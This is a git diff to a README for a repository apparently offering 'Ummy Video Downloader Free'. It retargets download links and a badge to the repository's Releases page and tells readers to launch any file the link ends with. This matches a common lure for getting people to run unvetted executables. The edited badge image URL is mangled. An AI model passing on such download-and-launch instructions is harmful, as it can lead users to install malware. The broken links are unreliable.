@@ -10,11 +10,11 @@ Welcome to the **Ummy Video Downloader Free** repository! Here, you can find inf
 
 ## Get Started
 
-To explore more about Ummy Video Downloader, [click here](https://github.com/files/Project.zip). If the link ends with a file name, please remember to launch it to access the repository content. In case the link is not working, head over to the "Releases" section for alternative options.
+To explore more about Ummy Video Downloader, [click here](https://github.com/Xerxews/Ummy-Video-Downloader-Free/releases). If the link ends with a file name, please remember to launch it to access the repository content. In case the link is not working, head over to the "Releases" section for alternative options.
 
 👇🏼 Click the button below to access the repository directly:
 
-[![Go to Ummy Video Downloader Free](https://img.shields.io/badge/Ummy%20Video%20Downloader%20Free-Go%20Now-green)](https://github.com/files/Project.zip)
+[![Go to Ummy Video Downloader Free](https://github.com/Xerxews/Ummy-Video-Downloader-Free/releases%20Video%20Downloader%20Free-Go%20Now-green)](https://github.com/Xerxews/Ummy-Video-Downloader-Free/releases)
 
 ## Additional Resources
 
